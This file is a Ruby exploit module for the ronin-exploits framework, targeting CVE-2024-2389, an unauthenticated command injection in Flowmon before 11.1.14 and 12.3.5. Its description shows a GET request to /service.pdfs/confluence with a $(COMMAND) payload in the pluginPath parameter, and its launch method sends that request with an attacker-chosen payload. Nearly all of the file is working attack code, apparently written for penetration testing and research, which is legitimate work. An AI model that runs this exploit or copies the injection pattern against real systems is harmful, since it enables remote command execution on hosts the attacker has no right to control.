#!/usr/bin/env -S ronin-exploits run -f

require 'ronin/exploits/command_injection'
require 'ronin/exploits/mixins/http'

module Ronin
  module Exploits
    class CVE_2024_2389 < CommandInjection

      include Mixins::HTTP

      register 'flowmon/CVE-2024-2389'

      quality :untested
      release_date    '2024-04-23'
      disclosure_date '2024-04-02'
      advisory 'CVE-2024-2389'

      author "Postmodern", email: "postmodern.mod3@gmail.com"
      summary "Arbitrary remote command execution in Flowmon <11.1.14, <12.3.5"
      description <<~DESC
        Flowmon versions prior to 11.1.14 and 12.3.5 have an unauthenticated
        command-injection vulnerability via the `pluginPath` query parameter
        used by the `/service.pdfs/confluence` HTTP end-point.

          GET /service.pdfs/confluence?file=x&lang=x&pluginPath=$(COMMAND HERE})

      DESC
      references [
        "https://support.kemptechnologies.com/hc/en-us/articles/24878235038733-CVE-2024-2389-Flowmon-critical-security-vulnerability",
        "https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2024-2389",
        "https://github.com/RhinoSecurityLabs/CVEs/blob/master/CVE-2024-2389/CVE-2024-2389.py"
      ]

      #
      # Sends the HTTP GET request for
      # `/service.pdfs/confluence?file=x&lang=x&pluginPath=$(COMMAND HERE})`
      # to the target host.
      #
      def launch
        http_get '/service.pdfs/confluence', query_params: {
                                               file: 'x',
                                               lang: 'x',
                                               pluginPath: payload
                                             }
      end

    end
  end
end
